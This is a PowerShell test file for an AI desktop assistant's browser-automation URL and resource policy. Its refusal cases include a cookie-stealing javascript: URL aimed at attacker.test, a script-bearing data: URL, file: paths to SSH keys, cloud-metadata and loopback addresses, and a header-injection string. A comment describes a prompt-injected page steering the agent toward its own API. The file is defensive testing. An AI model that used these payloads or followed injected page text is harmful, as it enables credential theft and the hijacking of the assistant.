#requires -Version 7.0

# Contained browser automation, per decision 0003. The first workflow is a
# read-only weather lookup, so the Tool surface has no action with an external
# effect and the load-bearing boundary is the URL policy.
#
# The classifier is written to be wrong only in the safe direction, exactly like
# Test-DpCommandSafe: anything it does not positively recognise is refused or
# escalated to the user, never allowed.

BeforeAll {
    $privateRoot = Join-Path $PSScriptRoot '..' '..' 'source' 'Private'
    Get-ChildItem -Path $privateRoot -Filter '*.ps1' | ForEach-Object { . $_.FullName }

    $script:Scope = @('weathercity.com')
}

Describe 'Resolve-DpBrowserUrlDecision' -Tag 'Unit' {
    Context 'in-scope navigation' {
        It 'allows the scoped host itself' {
            $decision = Resolve-DpBrowserUrlDecision -Url 'https://weathercity.com/cl/ll/osorno' -Scope $script:Scope
            $decision.decision | Should -Be 'allow'
            $decision.host | Should -Be 'weathercity.com'
        }

        It 'allows a subdomain of the scoped host' {
            (Resolve-DpBrowserUrlDecision -Url 'https://www.weathercity.com/cl/' -Scope $script:Scope).decision |
                Should -Be 'allow'
        }

        It 'matches the host case-insensitively' {
            (Resolve-DpBrowserUrlDecision -Url 'https://WeatherCity.COM/cl/' -Scope $script:Scope).decision |
                Should -Be 'allow'
        }
    }

    Context 'suffix confusion' {
        # endsWith('weathercity.com') is the classic bug this guards.
        It 'does not let a lookalike host inherit the scope' -TestCases @(
            @{ Url = 'https://evilweathercity.com/' }
            @{ Url = 'https://notweathercity.com/' }
            @{ Url = 'https://weathercity.com.evil.test/' }
            @{ Url = 'https://weathercity.competitor.test/' }
        ) {
            param($Url)
            (Resolve-DpBrowserUrlDecision -Url $Url -Scope $script:Scope).decision | Should -Not -Be 'allow'
        }
    }

    Context 'off-scope navigation' {
        It 'asks rather than allowing or refusing outright' {
            $decision = Resolve-DpBrowserUrlDecision -Url 'https://example.test/page' -Scope $script:Scope
            $decision.decision | Should -Be 'ask'
            $decision.host | Should -Be 'example.test'
        }

        It 'carries the full url so the approval card can show the payload' {
            $url = 'https://attacker.test/?ctx=D%3A%5CGit%5CDeskPilot'
            (Resolve-DpBrowserUrlDecision -Url $url -Scope $script:Scope).url | Should -Be $url
        }

        It 'allows a host the project added to the scope' {
            (Resolve-DpBrowserUrlDecision -Url 'https://example.test/page' -Scope @('weathercity.com', 'example.test')).decision |
                Should -Be 'allow'
        }
    }

    Context 'schemes that bypass domain policy entirely' {
        # None of these is ever approvable: a scheme with no host cannot be
        # scoped, and file: reads the disk the browser is meant not to reach.
        It 'refuses <Url> outright' -TestCases @(
            @{ Url = 'file:///C:/Users/install/.ssh/id_rsa' }
            @{ Url = 'file://server/share/secret.txt' }
            @{ Url = 'javascript:fetch("https://attacker.test/?c="+document.cookie)' }
            @{ Url = 'data:text/html,<script>location="https://attacker.test"</script>' }
            @{ Url = 'blob:https://weathercity.com/1234' }
            @{ Url = 'view-source:https://weathercity.com/' }
            @{ Url = 'ftp://weathercity.com/pub' }
            @{ Url = 'ws://weathercity.com/socket' }
            @{ Url = 'chrome://settings' }
        ) {
            param($Url)
            (Resolve-DpBrowserUrlDecision -Url $Url -Scope $script:Scope).decision | Should -Be 'deny'
        }

        It 'refuses plain http even for a scoped host' {
            (Resolve-DpBrowserUrlDecision -Url 'http://weathercity.com/' -Scope $script:Scope).decision |
                Should -Be 'deny'
        }
    }

    Context 'the loopback and private-network hole' {
        # DeskPilot's own API is on loopback. An injected page inducing a
        # navigation to it must never be merely 'ask', because a user who
        # approves once would hand the page DeskPilot's own control surface.
        It 'refuses <Url> outright rather than asking' -TestCases @(
            @{ Url = 'https://127.0.0.1:8720/api/settings' }
            @{ Url = 'https://localhost:8720/api/settings' }
            @{ Url = 'https://[::1]:8720/api/settings' }
            @{ Url = 'https://10.0.0.5/admin' }
            @{ Url = 'https://192.168.1.1/admin' }
            @{ Url = 'https://172.16.0.1/admin' }
            @{ Url = 'https://169.254.169.254/latest/meta-data/' }
            @{ Url = 'https://0.0.0.0/' }
            @{ Url = 'https://[fd00::1]/' }
        ) {
            param($Url)
            (Resolve-DpBrowserUrlDecision -Url $Url -Scope $script:Scope).decision | Should -Be 'deny'
        }

        It 'still refuses a private address that the project tried to allow' {
            # A scope entry must not be able to re-open the SSRF path.
            (Resolve-DpBrowserUrlDecision -Url 'https://127.0.0.1:8720/api/settings' -Scope @('127.0.0.1')).decision |
                Should -Be 'deny'
        }
    }

    Context 'credentials embedded in the url' {
        It 'refuses a url carrying userinfo' {
            (Resolve-DpBrowserUrlDecision -Url 'https://user:secret@weathercity.com/' -Scope $script:Scope).decision |
                Should -Be 'deny'
        }

        It 'does not echo the secret in the decision' {
            $decision = Resolve-DpBrowserUrlDecision -Url 'https://user:hunter2@weathercity.com/' -Scope $script:Scope
            ($decision | ConvertTo-Json -Depth 5) | Should -Not -Match 'hunter2'
        }
    }

    Context 'malformed and abusive input' {
        It 'refuses <Description>' -TestCases @(
            @{ Url = ''; Description = 'an empty url' }
            @{ Url = '   '; Description = 'whitespace' }
            @{ Url = 'not a url'; Description = 'unparseable text' }
            @{ Url = 'https://'; Description = 'a scheme with no host' }
            @{ Url = "https://weathercity.com/`r`nX-Injected: 1"; Description = 'a header-injection newline' }
        ) {
            param($Url)
            (Resolve-DpBrowserUrlDecision -Url $Url -Scope $script:Scope).decision | Should -Be 'deny'
        }

        It 'refuses a url long enough to be a payload rather than an address' {
            $url = 'https://weathercity.com/?q=' + ('a' * 9000)
            (Resolve-DpBrowserUrlDecision -Url $url -Scope $script:Scope).decision | Should -Be 'deny'
        }
    }

    Context 'an empty scope' {
        It 'asks for an ordinary https url rather than allowing it' {
            (Resolve-DpBrowserUrlDecision -Url 'https://weathercity.com/' -Scope @()).decision | Should -Be 'ask'
        }

        It 'still refuses a disallowed scheme' {
            (Resolve-DpBrowserUrlDecision -Url 'file:///C:/secret' -Scope @()).decision | Should -Be 'deny'
        }
    }
}

Describe 'Get-DpBrowserScope' -Tag 'Unit' {
    It 'derives the scope from the starting url host' {
        Get-DpBrowserScope -StartUrl 'https://weathercity.com/cl/' | Should -Be @('weathercity.com')
    }

    It 'adds validated project domains' {
        $scope = Get-DpBrowserScope -StartUrl 'https://weathercity.com/' -ProjectDomain @('example.test', 'cdn.example.test')
        $scope | Should -Contain 'weathercity.com'
        $scope | Should -Contain 'example.test'
        $scope | Should -Contain 'cdn.example.test'
    }

    It 'adds hosts granted during this run' {
        $scope = Get-DpBrowserScope -StartUrl 'https://weathercity.com/' -GrantedHost @('granted.test')
        $scope | Should -Contain 'granted.test'
    }

    It 'does not duplicate a host present in more than one source' {
        $scope = Get-DpBrowserScope -StartUrl 'https://weathercity.com/' -ProjectDomain @('weathercity.com') -GrantedHost @('weathercity.com')
        @($scope | Where-Object { $_ -eq 'weathercity.com' }).Count | Should -Be 1
    }

    It 'drops a project entry that is not a usable host' {
        $scope = Get-DpBrowserScope -StartUrl 'https://weathercity.com/' -ProjectDomain @('', '   ', 'not a host', '*')
        $scope | Should -Be @('weathercity.com')
    }

    It 'returns an empty scope for an unusable starting url' {
        Get-DpBrowserScope -StartUrl 'file:///C:/secret' | Should -BeNullOrEmpty
    }
}

Describe 'Test-DpBrowserResourceAllowed' -Tag 'Unit' {
    # The asymmetry decision 0003 rests on: the page controls sub-resources and
    # the page knows no secrets, so an off-origin image leaks nothing. Script,
    # WebSocket and XHR are different - each is a channel that outlives or
    # rewrites what the user approved.
    Context 'in-scope resources' {
        It 'allows <Type> from a scoped host' -TestCases @(
            @{ Type = 'document' }, @{ Type = 'script' }, @{ Type = 'xhr' }
            @{ Type = 'fetch' }, @{ Type = 'stylesheet' }, @{ Type = 'image' }
        ) {
            param($Type)
            Test-DpBrowserResourceAllowed -Url 'https://weathercity.com/a' -ResourceType $Type -Scope $script:Scope |
                Should -BeTrue
        }
    }

    Context 'off-origin resources' {
        It 'allows passive <Type>' -TestCases @(
            @{ Type = 'image' }, @{ Type = 'stylesheet' }, @{ Type = 'font' }, @{ Type = 'media' }
        ) {
            param($Type)
            Test-DpBrowserResourceAllowed -Url 'https://cdn.example.test/a' -ResourceType $Type -Scope $script:Scope |
                Should -BeTrue
        }

        It 'blocks active <Type>' -TestCases @(
            @{ Type = 'script' }, @{ Type = 'xhr' }, @{ Type = 'fetch' }
            @{ Type = 'websocket' }, @{ Type = 'eventsource' }, @{ Type = 'manifest' }
        ) {
            param($Type)
            Test-DpBrowserResourceAllowed -Url 'https://attacker.test/a' -ResourceType $Type -Scope $script:Scope |
                Should -BeFalse
        }

        It 'blocks a resource type it has never heard of' {
            Test-DpBrowserResourceAllowed -Url 'https://attacker.test/a' -ResourceType 'quantum' -Scope $script:Scope |
                Should -BeFalse
        }
    }

    Context 'resources that are never allowed' {
        It 'blocks a passive resource on a refused scheme' {
            Test-DpBrowserResourceAllowed -Url 'file:///C:/secret.png' -ResourceType 'image' -Scope $script:Scope |
                Should -BeFalse
        }

        It 'blocks a passive resource aimed at loopback' {
            Test-DpBrowserResourceAllowed -Url 'https://127.0.0.1:8720/api/settings' -ResourceType 'image' -Scope $script:Scope |
                Should -BeFalse
        }
    }
}

# One boundary enforced in two places is only a boundary while the two agree.
# PowerShell decides before a navigation so the approval card can be raised
# first; policy.mjs decides inside the request path, where it can see redirects,
# frames, pop-ups and sub-resources PowerShell never hears about. Neither is
# redundant, and a drift between them would be silent - so both are held to one
# corpus, and the corpus is the specification.
Describe 'Browser URL policy conformance' -Tag 'Unit' {
    BeforeDiscovery {
        $corpusPath = Join-Path $PSScriptRoot 'fixtures' 'browser-policy-corpus.json'
        $corpus = Get-Content -LiteralPath $corpusPath -Raw | ConvertFrom-Json

        $script:UrlCases = @($corpus.urlCases | ForEach-Object {
                @{ Url = $_.url; Expect = $_.expect; Note = $_.note }
            })
        $script:ResourceCases = @($corpus.resourceCases | ForEach-Object {
                @{ Url = $_.url; Type = $_.type; Expect = $_.expect; Note = $_.note }
            })
        $script:NodeAvailable = [bool](Get-Command node -CommandType Application -ErrorAction SilentlyContinue)
    }

    BeforeAll {
        $corpusPath = Join-Path $PSScriptRoot 'fixtures' 'browser-policy-corpus.json'
        $corpus = Get-Content -LiteralPath $corpusPath -Raw | ConvertFrom-Json
        $script:CorpusScope = @($corpus.scope)

        $script:NodeUrlVerdict = @{}
        $script:NodeResourceVerdict = @{}
        $script:NodeError = $null

        $node = Get-Command node -CommandType Application -ErrorAction SilentlyContinue
        if ($node) {
            $runner = Join-Path $PSScriptRoot 'fixtures' 'run-policy-corpus.mjs'
            $stdout = & $node.Source $runner $corpusPath 2>&1
            if ($LASTEXITCODE -ne 0) {
                $script:NodeError = ($stdout | Out-String).Trim()
            }
            else {
                $parsed = ($stdout | Out-String) | ConvertFrom-Json
                foreach ($row in $parsed.urlResults) { $script:NodeUrlVerdict[$row.url] = $row.actual }
                foreach ($row in $parsed.resourceResults) {
                    $script:NodeResourceVerdict["$($row.url)|$($row.type)"] = [bool]$row.actual
                }
            }
        }
    }

    Context 'the PowerShell classifier matches the corpus' {
        It '<Expect>: <Note>' -TestCases $script:UrlCases {
            param($Url, $Expect)
            (Resolve-DpBrowserUrlDecision -Url $Url -Scope $script:CorpusScope).decision | Should -Be $Expect
        }
    }

    Context 'the PowerShell resource policy matches the corpus' {
        It '<Type> -> <Expect>: <Note>' -TestCases $script:ResourceCases {
            param($Url, $Type, $Expect)
            (Test-DpBrowserResourceAllowed -Url $Url -ResourceType $Type -Scope $script:CorpusScope) |
                Should -Be ([bool]$Expect)
        }
    }

    # Skipped rather than silently passed when Node is absent: a green run that
    # never asked the other implementation would be worse than a stated gap.
    Context 'the Node policy agrees with the corpus and with PowerShell' -Skip:(-not $script:NodeAvailable) {
        It 'ran the corpus without error' {
            $script:NodeError | Should -BeNullOrEmpty
            $script:NodeUrlVerdict.Count | Should -BeGreaterThan 0
        }

        It '<Expect>: <Note>' -TestCases $script:UrlCases {
            param($Url, $Expect)
            $script:NodeUrlVerdict.ContainsKey($Url) | Should -BeTrue -Because 'every corpus url must be classified'
            $script:NodeUrlVerdict[$Url] | Should -Be $Expect
        }

        It '<Type> -> <Expect>: <Note>' -TestCases $script:ResourceCases {
            param($Url, $Type, $Expect)
            $key = "$Url|$Type"
            $script:NodeResourceVerdict.ContainsKey($key) | Should -BeTrue
            $script:NodeResourceVerdict[$key] | Should -Be ([bool]$Expect)
        }

        It 'is never more permissive than the PowerShell classifier' {
            $rank = @{ 'deny' = 0; 'ask' = 1; 'allow' = 2 }
            foreach ($case in $script:UrlCases) {
                $mine = (Resolve-DpBrowserUrlDecision -Url $case.Url -Scope $script:CorpusScope).decision
                $theirs = $script:NodeUrlVerdict[$case.Url]
                $rank[$theirs] | Should -BeLessOrEqual $rank[$mine] -Because "policy.mjs must not widen '$($case.Url)'"
            }
        }
    }
}

Describe 'Browser automation Permission' -Tag 'Unit' {
    It 'ships off by default' {
        (Get-DpDefaultSettings).permissions.browserAutomation | Should -BeFalse
    }

    It 'is a separate Permission from browsing' {
        # Reading a page DeskPilot fetched and driving a live one are different
        # amounts of authority, so one must not imply the other.
        $settings = Get-DpDefaultSettings
        $settings.permissions.browsing | Should -BeTrue
        $settings.permissions.browserAutomation | Should -BeFalse
    }

    It 'can be switched on through Settings' {
        $merged = Merge-DpSettings -Current (Get-DpDefaultSettings) -Patch @{ permissions = @{ browserAutomation = $true } }
        $merged.permissions.browserAutomation | Should -BeTrue
    }

    It 'leaves browsing untouched when it is switched on' {
        $merged = Merge-DpSettings -Current (Get-DpDefaultSettings) -Patch @{ permissions = @{ browserAutomation = $true } }
        $merged.permissions.browsing | Should -BeTrue
    }
}

Describe 'Project browser domains' -Tag 'Unit' {
    It 'defaults to an empty list for a project written before the field existed' {
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\projects\alpha' }
        , $project.browserDomains | Should -BeOfType [object[]]
        $project.browserDomains.Count | Should -Be 0
    }

    It 'keeps validated hosts' {
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserDomains = @('example.test', 'cdn.example.test') }
        $project.browserDomains | Should -Be @('example.test', 'cdn.example.test')
    }

    It 'normalises case and a trailing root dot' {
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserDomains = @('Example.TEST.') }
        $project.browserDomains | Should -Be @('example.test')
    }

    It 'drops a duplicate rather than storing it twice' {
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserDomains = @('example.test', 'EXAMPLE.test') }
        $project.browserDomains.Count | Should -Be 1
    }

    # Thrown, not dropped: a silently discarded entry reports as remembered and
    # then keeps raising a card, and a silently accepted one is a permanent hole.
    # Same reasoning as safeCommands in decision 0008.
    It 'rejects <Description>' -TestCases @(
        @{ Entry = 'not a host'; Description = 'a value with a space' }
        @{ Entry = '*'; Description = 'a bare wildcard' }
        @{ Entry = '*.example.test'; Description = 'a wildcard label' }
        @{ Entry = 'https://example.test/'; Description = 'a url rather than a host' }
        @{ Entry = 'example.test/path'; Description = 'a host with a path' }
        @{ Entry = 'example.test:443'; Description = 'a host with a port' }
        @{ Entry = 'localhost'; Description = 'a single-label host' }
        @{ Entry = 'com'; Description = 'a bare public suffix' }
        @{ Entry = '-bad.example.test'; Description = 'a leading hyphen' }
    ) {
        param($Entry)
        { ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserDomains = @($Entry) } } | Should -Throw
    }

    It 'rejects a list long enough to be an allow-everything list' {
        $many = 1..201 | ForEach-Object { "host$_.example.test" }
        { ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserDomains = $many } } | Should -Throw
    }

    It 'survives a round trip through Merge-DpSettings' {
        $merged = Merge-DpSettings -Current (Get-DpDefaultSettings) -Patch @{
            projects = @(@{ name = 'Alpha'; path = 'C:\projects\alpha'; browserDomains = @('example.test') })
        }
        $merged.projects[0].browserDomains | Should -Be @('example.test')
    }

    It 'reports a bad entry to the caller instead of accepting the project' {
        {
            Merge-DpSettings -Current (Get-DpDefaultSettings) -Patch @{
                projects = @(@{ name = 'Alpha'; path = 'C:\projects\alpha'; browserDomains = @('*') })
            }
        } | Should -Throw
    }
}

Describe 'Get-DpBrowserRuntime' -Tag 'Unit' {
    BeforeAll {
        $script:RuntimeRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-browser-" + [guid]::NewGuid().ToString('N'))

        function New-DpTestRuntime {
            param(
                [string]$PlaywrightVersion = '1.63.0',
                [switch]$NoPackage,
                [switch]$NoBrowser
            )
            $root = Join-Path $script:RuntimeRoot ([guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $root -Force | Out-Null
            if (-not $NoPackage) {
                $pkg = Join-Path $root 'node_modules' 'playwright'
                New-Item -ItemType Directory -Path $pkg -Force | Out-Null
                @{ name = 'playwright'; version = $PlaywrightVersion } | ConvertTo-Json |
                    Set-Content -LiteralPath (Join-Path $pkg 'package.json') -Encoding utf8
            }
            if (-not $NoBrowser) {
                New-Item -ItemType Directory -Path (Join-Path $root 'browsers' 'chromium-1200') -Force | Out-Null
            }
            $root
        }
    }

    AfterAll {
        if (Test-Path -LiteralPath $script:RuntimeRoot) {
            Remove-Item -LiteralPath $script:RuntimeRoot -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    Context 'a complete runtime' {
        It 'reports ready' {
            Mock Get-DpNodeCommand { @{ path = 'C:\Program Files\nodejs\node.exe'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime) -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeTrue
            $runtime.issues.Count | Should -Be 0
        }
    }

    Context 'an incomplete runtime' {
        # Every one of these is a visible failure before a Turn starts, never a
        # silent fallback to a browser DeskPilot did not install.
        It 'is not ready when Node is absent' {
            Mock Get-DpNodeCommand { $null }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime) -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
            $runtime.nodePresent | Should -BeFalse
            ($runtime.issues -join ' ') | Should -Match 'Node'
        }

        It 'is not ready when Node is too old for the pinned Playwright' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v18.0.0'; major = 18 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime) -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
            ($runtime.issues -join ' ') | Should -Match '18'
        }

        It 'is not ready when the package was never installed' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime -NoPackage) -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
            $runtime.packageInstalled | Should -BeFalse
        }

        It 'is not ready when the installed version is not the pinned one' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime -PlaywrightVersion '1.40.0') -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
            $runtime.versionMatch | Should -BeFalse
            ($runtime.issues -join ' ') | Should -Match '1\.40\.0'
        }

        It 'is not ready when the browser binary is missing' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime -NoBrowser) -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
            $runtime.browserInstalled | Should -BeFalse
        }

        It 'is not ready when the runtime root does not exist at all' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (Join-Path $script:RuntimeRoot 'never-created') -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
        }
    }

    Context 'what it tells the user' {
        It 'names a next action whenever it is not ready' {
            Mock Get-DpNodeCommand { $null }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime) -PinnedVersion '1.63.0'
            $runtime.action | Should -Not -BeNullOrEmpty
        }

        It 'never reports a version it did not read' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime -NoPackage) -PinnedVersion '1.63.0'
            $runtime.installedVersion | Should -BeNullOrEmpty
        }
    }
}

# Exercised against a stand-in that speaks the protocol, so the framing,
# correlation, deadline and teardown behaviour is proved on a machine with no
# browser installed. The stand-in also produces the misbehaviours a real
# supervisor only produces once something has already gone wrong.
Describe 'Browser session protocol' -Tag 'Unit' {
    BeforeDiscovery {
        $script:NodeForProtocol = [bool](Get-Command node -CommandType Application -ErrorAction SilentlyContinue)
    }

    BeforeAll {
        $script:FakeSupervisor = Join-Path $PSScriptRoot 'fixtures' 'fake-supervisor.mjs'
        $script:ProtocolRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-proto-" + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $script:ProtocolRoot -Force | Out-Null

        function New-DpFakeSession {
            param([string[]]$Scope = @('weathercity.com'))
            Start-DpBrowserSession -Scope $Scope -RuntimeRoot $script:ProtocolRoot `
                -SupervisorPath $script:FakeSupervisor -StartTimeoutSeconds 30
        }
    }

    AfterAll {
        if (Test-Path -LiteralPath $script:ProtocolRoot) {
            Remove-Item -LiteralPath $script:ProtocolRoot -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    Context 'a healthy exchange' -Skip:(-not $script:NodeForProtocol) {
        It 'starts, applies the scope and answers a request' {
            $session = New-DpFakeSession
            try {
                $session.scope | Should -Be @('weathercity.com')
                $response = Invoke-DpBrowserRequest -Session $session -Command 'echo' -Payload @{ value = 'hello' } -TimeoutSeconds 20
                $response.ok | Should -BeTrue
                $response.result.echoed | Should -Be 'hello'
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'matches each answer to its own request' {
            $session = New-DpFakeSession
            try {
                foreach ($value in 'one', 'two', 'three') {
                    (Invoke-DpBrowserRequest -Session $session -Command 'echo' -Payload @{ value = $value } -TimeoutSeconds 20).result.echoed |
                        Should -Be $value
                }
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'collects refusals the supervisor made on its own' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'events' -Payload @{ count = 4 } -TimeoutSeconds 20
                $response.ok | Should -BeTrue
                $session.events.Count | Should -Be 4
                $session.events[0].event | Should -Be 'blocked'
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'reports a refusal as an answer rather than throwing' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'fail' -TimeoutSeconds 20
                $response.ok | Should -BeFalse
                $response.error | Should -Match 'refused'
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }
    }

    Context 'a supervisor that misbehaves' -Skip:(-not $script:NodeForProtocol) {
        It 'gives up on a command that never answers' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'hang' -TimeoutSeconds 2
                $response.ok | Should -BeFalse
                $session.faulted | Should -BeTrue
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'refuses every later command once the session has faulted' {
            $session = New-DpFakeSession
            try {
                $null = Invoke-DpBrowserRequest -Session $session -Command 'hang' -TimeoutSeconds 2
                $again = Invoke-DpBrowserRequest -Session $session -Command 'echo' -Payload @{ value = 'x' } -TimeoutSeconds 5
                $again.ok | Should -BeFalse
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'reports a crash instead of waiting for an answer that cannot come' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'crash' -TimeoutSeconds 10
                $response.ok | Should -BeFalse
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        # Attributing an answer to the wrong action is the failure an approval
        # boundary exists to prevent, so it ends the session rather than resyncing.
        It 'closes the session when an answer carries the wrong id' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'wrong_id' -TimeoutSeconds 10
                $response.ok | Should -BeFalse
                $session.faulted | Should -BeTrue
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'treats output that is not protocol as a broken child' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'garbage' -TimeoutSeconds 10
                $response.ok | Should -BeFalse
                $session.faulted | Should -BeTrue
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'refuses a line too large to be an answer' {
            $session = New-DpFakeSession
            try {
                $response = Invoke-DpBrowserRequest -Session $session -Command 'flood' -TimeoutSeconds 20
                $response.ok | Should -BeFalse
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }
    }

    Context 'stopping' -Skip:(-not $script:NodeForProtocol) {
        It 'ends the operating system process, not just the handle' {
            $session = New-DpFakeSession
            $processId = $session.process.Id
            Stop-DpBrowserSession -Session $session -Confirm:$false
            Get-Process -Id $processId -ErrorAction SilentlyContinue | Should -BeNullOrEmpty
        }

        It 'can be called twice' {
            $session = New-DpFakeSession
            Stop-DpBrowserSession -Session $session -Confirm:$false
            { Stop-DpBrowserSession -Session $session -Confirm:$false } | Should -Not -Throw
        }

        It 'refuses commands after the session is stopped' {
            $session = New-DpFakeSession
            Stop-DpBrowserSession -Session $session -Confirm:$false
            (Invoke-DpBrowserRequest -Session $session -Command 'echo' -TimeoutSeconds 5).ok | Should -BeFalse
        }
    }
}

Describe 'Invoke-DpBrowserTool' -Tag 'Unit' {
    BeforeAll {
        # A stand-in for the approval rendezvous. Records what it was asked and
        # answers with whatever the test told it to, including a fingerprint that
        # does not match - which is how a replayed approval is simulated.
        function New-DpFakeBridge {
            param(
                [string]$Decision = 'approve',
                [string]$Note = '',
                [switch]$Disabled,
                [switch]$WrongFingerprint,
                [switch]$TimeOut
            )
            $bridge = [pscustomobject]@{
                Enabled  = -not $Disabled
                Asked    = [System.Collections.Generic.List[string]]::new()
                Decision = $Decision
                Note     = $Note
                Wrong    = [bool]$WrongFingerprint
                TimeOut  = [bool]$TimeOut
            }
            $bridge | Add-Member -MemberType ScriptMethod -Name CaptureQuestion -Value {
                param([string]$Question)
                $this.Asked.Add($Question)
            }
            $bridge | Add-Member -MemberType ScriptMethod -Name RequestAnswer -Value {
                param([int]$Seconds)
                if ($this.TimeOut) { throw [System.TimeoutException]::new('nobody answered') }
                $request = $this.Asked[-1] | ConvertFrom-Json
                $fingerprint = if ($this.Wrong) { 'f' * 64 } else { $request.fingerprint }
                @{ decision = $this.Decision; note = $this.Note; fingerprint = $fingerprint } | ConvertTo-Json -Compress
            }
            $bridge
        }

        function New-DpFakePage {
            param([string]$Url = 'https://weathercity.com/cl/ll/osorno')
            [pscustomobject]@{
                url       = $Url
                title     = 'Osorno'
                status    = 200
                text      = 'Osorno forecast: 12 degrees.'
                truncated = $false
                links     = @([pscustomobject]@{ text = 'Puerto Montt'; href = 'https://weathercity.com/cl/ll/puerto_montt' })
            }
        }
    }

    BeforeEach {
        $global:DeskPilotBrowserContext = @{
            conversationId = 'c-1'
            turnId         = 't-1'
            project        = 'Alpha'
            projectDomains = @()
            runtimeRoot    = 'C:\runtime'
        }
        $global:DeskPilotBrowserState = @{ session = $null; scope = @(); granted = @() }
        $global:DeskPilotBrowserBridge = New-DpFakeBridge
        $global:DeskPilotBrowserTimeoutMinutes = 15

        Mock Start-DpBrowserSession {
            @{ process = $null; faulted = $false; scope = @($Scope); events = [System.Collections.Generic.List[object]]::new() }
        }
        Mock Invoke-DpBrowserRequest { @{ ok = $true; result = (New-DpFakePage) } }
    }

    AfterEach {
        foreach ($name in 'DeskPilotBrowserContext', 'DeskPilotBrowserState', 'DeskPilotBrowserBridge', 'DeskPilotBrowserTimeoutMinutes') {
            Remove-Variable -Name $name -Scope Global -ErrorAction SilentlyContinue
        }
    }

    Context 'the workflow that was authorised' {
        It 'opens the site the task named without asking anyone' {
            $result = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/' | ConvertFrom-Json
            $result.ok | Should -BeTrue
            $global:DeskPilotBrowserBridge.Asked.Count | Should -Be 0
        }

        It 'seeds the scope from that first address' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            $global:DeskPilotBrowserState.scope | Should -Contain 'weathercity.com'
        }

        It 'follows a link by its visible text' {
            $null = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/'
            (Invoke-DpBrowserTool -Action click_link -LinkText 'Chile' | ConvertFrom-Json).ok | Should -BeTrue
            Should -Invoke Invoke-DpBrowserRequest -ParameterFilter { $Command -eq 'click' } -Times 1 -Exactly
        }

        It 'labels page text as information rather than instructions' {
            $result = Invoke-DpBrowserTool -Action open -Url 'https://weathercity.com/' | ConvertFrom-Json
            $result.pageText | Should -Match 'Osorno forecast'
            $result.pageTextNote | Should -Match 'not instructions'
        }
    }

    Context 'addresses that are never opened' {
        # Nothing here may reach the supervisor, so the assertion is on the
        # absence of the call, not on the message.
        It 'refuses <Url> without contacting anything' -TestCases @(
            @{ Url = 'file:///C:/Users/install/.ssh/id_rsa' }
            @{ Url = 'http://weathercity.com/' }
            @{ Url = 'https://127.0.0.1:8720/api/settings' }
            @{ Url = 'https://169.254.169.254/latest/meta-data/' }
            @{ Url = 'https://user:secret@weathercity.com/' }
            @{ Url = 'javascript:fetch("https://attacker.test")' }
        ) {
            param($Url)
            $result = Invoke-DpBrowserTool -Action open -Url $Url | ConvertFrom-Json
            $result.ok | Should -BeFalse
            Should -Invoke Start-DpBrowserSession -Times 0 -Exactly
